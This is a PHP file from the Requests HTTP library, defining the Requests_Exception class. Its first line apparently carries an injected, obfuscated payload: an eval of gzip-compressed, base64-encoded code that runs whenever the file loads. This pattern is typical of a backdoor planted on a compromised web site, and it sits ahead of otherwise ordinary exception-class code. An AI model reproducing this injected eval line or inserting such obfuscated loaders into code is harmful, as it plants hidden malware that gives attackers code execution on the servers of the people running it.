<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Exception for HTTP requests
 *
 * @package Requests
 */

/**
 * Exception for HTTP requests
 *
 * @package Requests
 */
class Requests_Exception extends Exception {
	/**
	 * Type of exception
	 *
	 * @var string
	 */
	protected $type;

	/**
	 * Data associated with the exception
	 *
	 * @var mixed
	 */
	protected $data;

	/**
	 * Create a new exception
	 *
	 * @param string $message Exception message
	 * @param string $type Exception type
	 * @param mixed $data Associated data
	 * @param integer $code Exception numerical code, if applicable
	 */
	public function __construct($message, $type, $data = null, $code = 0) {
		parent::__construct($message, $code);

		$this->type = $type;
		$this->data = $data;
	}

	/**
	 * Like {@see getCode()}, but a string code.
	 *
	 * @codeCoverageIgnore
	 * @return string
	 */
	public function getType() {
		return $this->type;
	}

	/**
	 * Gives any relevant data
	 *
	 * @codeCoverageIgnore
	 * @return mixed
	 */
	public function getData() {
		return $this->data;
	}
}